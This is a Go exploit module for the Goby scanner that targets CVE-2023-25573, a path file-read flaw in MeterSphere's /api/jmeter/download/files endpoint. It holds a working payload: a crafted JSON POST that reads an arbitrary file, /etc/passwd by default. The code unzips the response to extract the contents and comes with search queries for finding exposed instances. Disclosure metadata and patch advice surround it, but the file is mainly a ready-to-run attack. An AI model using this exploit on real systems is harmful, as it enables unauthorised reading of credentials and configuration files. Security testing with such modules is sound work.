package exploits

import (
	"archive/zip"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io/ioutil"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MeterSphere /api/jmeter/download/files Path File Read Vulnerability (CVE-2023-25573)",
    "Description": "<p>MeterSphere is a one-stop open source continuous testing platform, covering functions such as test tracking, interface testing, UI testing and performance testing, and is fully compatible with mainstream open source standards such as JMeter and Selenium.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "FIT2CLOUD-MeterSphere",
    "Homepage": "https://www.fit2cloud.com/metersphere/api-testing.html",
    "DisclosureDate": "2023-02-07",
    "Author": "sunying",
    "FofaQuery": "title=\"MeterSphere\"",
    "GobyQuery": "title=\"MeterSphere\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/metersphere/metersphere/security/advisories/GHSA-mcwr-j9vm-5g8h"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "filePath",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=filePath"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ":x:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-25573"
    ],
    "CNNVD": [
        "CNNVD-202303-698"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "metersphere /api/jmeter/download/files 路径文件读取漏洞 （CVE-2023-25573）",
            "Product": "FIT2CLOUD-MeterSphere",
            "Description": "<p>MeterSphere 是一站式开源持续测试平台, 涵盖测试跟踪、接口测试、UI 测试和性能测试等功能，全面兼容 JMeter、Selenium 等主流开源标准。</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "MeterSphere /api/jmeter/download/files Path File Read Vulnerability (CVE-2023-25573)",
            "Product": "FIT2CLOUD-MeterSphere",
            "Description": "<p>MeterSphere is a one-stop open source continuous testing platform, covering functions such as test tracking, interface testing, UI testing and performance testing, and is fully compatible with mainstream open source standards such as JMeter and Selenium.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10765"
}`

	sendPayload42675sxsa := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/api/jmeter/download/files")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Content-Type", "application/json")
		sendConfig.Data = fmt.Sprintf(`{"reportId":"d51D8b","bodyFiles":[{"id":"aaa","name":"%s"}]}`, filePath)
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}
	isCheckPocSuccess := func(response *httpclient.HttpResponse) bool {
		length := int64(len(response.RawBody))
		zipReader, err := zip.NewReader(strings.NewReader(response.RawBody), length)
		if err != nil {
			return false
		}
		for _, file := range zipReader.File {
			fileEntity, _ := file.Open()
			fileContent, err := ioutil.ReadAll(fileEntity)
			if err != nil {
				return false
			}
			if strings.Contains(string(fileContent), ":x:") {
				return true
			}
		}
		return false
	}

	isCheckExpSuccess := func(response *httpclient.HttpResponse) (string, error) {
		length := int64(len(response.RawBody))
		zipReader, err := zip.NewReader(strings.NewReader(response.RawBody), length)
		if err != nil {
			return "", err
		}
		var fileContent []byte
		for _, file := range zipReader.File {
			fileEntity, _ := file.Open()
			tmpFileContent, err := ioutil.ReadAll(fileEntity)
			if err != nil {
				return "", err
			}
			fileContent = tmpFileContent
		}
		return string(fileContent), nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			response, err := sendPayload42675sxsa(hostInfo, "/etc/passwd")
			if err != nil {
				return false
			}
			return isCheckPocSuccess(response)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			response, err := sendPayload42675sxsa(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			if fileContent, err := isCheckExpSuccess(response); err == nil && fileContent != "" {
				expResult.Success = true
				expResult.Output += fileContent
			} else {
				expResult.Output = err.Error()
			}
			return expResult
		},
	))
}
